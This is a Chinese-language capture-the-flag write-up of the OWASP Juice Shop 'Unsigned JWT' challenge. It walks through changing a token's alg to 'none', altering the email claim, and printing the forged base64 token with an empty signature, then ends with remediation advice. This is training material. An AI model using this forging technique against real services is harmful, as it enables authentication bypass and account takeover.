# Juice-Shop Write-up: 未签名 JWT

## 挑战概述

**标题：** Unsigned JWT  
**类别：** 身份验证失效  
**难度：** ⭐⭐⭐⭐⭐ (5/6)

本挑战聚焦于利用应用未正确验证 JSON Web Token（JWT）的漏洞。目标是修改现有 JWT，在没有有效签名的情况下绕过身份验证检查。

## 使用工具

- **Web 浏览器：** 用于捕获和操纵 JWT。
- **JWT.io：** 用于解码、验证和生成 JWT 的工具。
- **Base64 URL 编码器/解码器：** 用于手动编码和解码 Base64 URL 字符串（https://www.base64url.com/）。

## 方法与解题过程

### 步骤 1：了解 JWT

JWT 通常由三部分组成：Header、Payload 和 Signature。Header 指定用于签名的算法。

<img src="../assets/difficulty5/unsigned_jwt_3.png" alt="part of JWT" width="500px">

JWT 存在许多可利用的漏洞；本挑战利用的是服务器未正确验证签名。Header 中会指定签名所用算法，但在某些错误配置的情况下，服务器允许该字段为“none”。

### 步骤 2：捕获并解码 JWT

正常登录 Juice Shop 应用，捕获有效 JWT。该 JWT 存储在浏览器名为 `token` 的 cookie 中，并用于后续向服务器发送经过身份验证的请求。

**JWT 示例：**
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjQtMDQtMzAgMDc6MTI6MTMuMDAxICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjQtMDQtMzAgMDk6MTg6MDQuNzU5ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTcxNDQ3NzE5NX0.GOsP9r-lbRSiABNxNec0YrfN0Nru4yVqJLyxkGOM_07R1hZHKPtaMI-1HvqBIJ5ycyOvDFO4gIwjcLOl6ktWkEcwcTHt0fzJKjaa3WpwkFOclL3wvccm0ZiDKBr2b4w6Fkfc0CphmcFSRRYq6lws-J1XUHsTl4QL14JfjEvVauQ
```

### 步骤 3：操纵 JWT

使用 JWT.io 操纵 JWT：
- **修改 Header：** 将 `alg` 属性从 `RS256`（或类似值）改为 `none`，让应用认为该 token 无需验证。
- **修改 Payload：** 将 `email` 字段改为 `jwtn3d@juice-sh.op`，以满足挑战要求。

**伪造的 JWT 示例：**

我们分别复制 Header 和 Payload 的明文内容，并粘贴到 Base64 转换器中进行编码。

<img src="../assets/difficulty5/unsigned_jwt_5.png" alt="example conversion" width="500px">

虽然有工具可以自动完成此过程，但由于我们将签名设为 none，我更倾向于手动操作以避免错误。

Header：

```
ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0
```

Payload：
```
ewogICJzdGF0dXMiOiAic3VjY2VzcyIsCiAgImRhdGEiOiB7CiAgICAiaWQiOiAxLAogICAgInVzZXJuYW1lIjogIiIsCiAgICAiZW1haWwiOiAiand0bjNkQGp1aWNlLXNoLm9wIiwKICAgICJwYXNzd29yZCI6ICIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsCiAgICAicm9sZSI6ICJhZG1pbiIsCiAgICAiZGVsdXhlVG9rZW4iOiAiIiwKICAgICJsYXN0TG9naW5JcCI6ICJ1bmRlZmluZWQiLAogICAgInByb2ZpbGVJbWFnZSI6ICJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLAogICAgInRvdHBTZWNyZXQiOiAiIiwKICAgICJpc0FjdGl2ZSI6IHRydWUsCiAgICAiY3JlYXRlZEF0IjogIjIwMjQtMDQtMzAgMDc6MTI6MTMuMDAxICswMDowMCIsCiAgICAidXBkYXRlZEF0IjogIjIwMjQtMDQtMzAgMDk6MTg6MDQuNzU5ICswMDowMCIsCiAgICAiZGVsZXRlZEF0IjogbnVsbAogIH0sCiAgImlhdCI6IDE3MTQ0NzcxOTUKfQ==
```

将字符串拼接起来，构成新的 JWT：{HEADER}.{PAYLOAD}.{SIGNATURE}
注意，即使签名为空，也必须保留末尾的点号，JWT 才能正常工作。

最终结果如下：
```
ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0. ewogICJzdGF0dXMiOiAic3VjY2VzcyIsCiAgImRhdGEiOiB7CiAgICAiaWQiOiAxLAogICAgInVzZXJuYW1lIjogIiIsCiAgICAiZW1haWwiOiAiand0bjNkQGp1aWNlLXNoLm9wIiwKICAgICJwYXNzd29yZCI6ICIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsCiAgICAicm9sZSI6ICJhZG1pbiIsCiAgICAiZGVsdXhlVG9rZW4iOiAiIiwKICAgICJsYXN0TG9naW5JcCI6ICJ1bmRlZmluZWQiLAogICAgInByb2ZpbGVJbWFnZSI6ICJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLAogICAgInRvdHBTZWNyZXQiOiAiIiwKICAgICJpc0FjdGl2ZSI6IHRydWUsCiAgICAiY3JlYXRlZEF0IjogIjIwMjQtMDQtMzAgMDc6MTI6MTMuMDAxICswMDowMCIsCiAgICAidXBkYXRlZEF0IjogIjIwMjQtMDQtMzAgMDk6MTg6MDQuNzU5ICswMDowMCIsCiAgICAiZGVsZXRlZEF0IjogbnVsbAogIH0sCiAgImlhdCI6IDE3MTQ0NzcxOTUKfQ.
```

如果出错，根据输入此 JWT 的位置，可以尝试将其转换为 Base64 URL。

### 步骤 4：测试伪造的 JWT

在浏览器 cookie 存储中，用伪造的 JWT 替换合法 JWT，并在 whoami API 请求中使用它，观察 API 响应：

<img src="../assets/difficulty5/unsigned_jwt_6.png" alt="new JWT request" width="500px">

## 解题说明

应用未能强制验证 JWT 签名，因此利用成功。通过将 JWT Header 中的签名算法改为 `alg: none`，应用跳过了本应执行的验证步骤。

## 修复建议

- **实施签名验证：** 确保应用使用已知公钥或密钥验证 JWT 签名，防止使用伪造 token。
- **禁用 None 算法：** 配置 JWT 库或框架，拒绝指定 `"alg": "none"` 或签名为空的 token。
